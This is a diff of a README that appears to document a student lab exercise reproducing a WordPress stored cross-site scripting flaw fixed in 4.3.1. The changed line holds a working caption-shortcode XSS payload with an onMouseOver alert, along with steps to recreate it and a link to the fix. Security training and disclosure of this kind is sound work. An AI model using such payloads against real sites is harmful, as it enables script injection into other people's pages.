@@ -14,7 +14,7 @@ Time spent: **4** hours spent in total
     - Fixed in version: 4.3.1
   - [X] GIF Walkthrough: https://puu.sh/zK4da/f02dedf433.gif
   - [X] Steps to recreate:
-    - Make a post with this code: XSS Attack[caption width="1" caption='<a href="' ">]</a.><a href="http:// onMouseOver='alert(1)'">CLICK THIS</a.>
+    - Make a post with this code: XSS Attack[caption width="1" caption='<.a href="' ">]</a><.a href="http:// onMouseOver='alert(1)'">CLICK THIS</a>
     - Access the post.
   - [X] Affected source code:
     - [Link 1](https://github.com/WordPress/WordPress/commit/f72b21af23da6b6d54208e5c1d65ececdaa109c8)
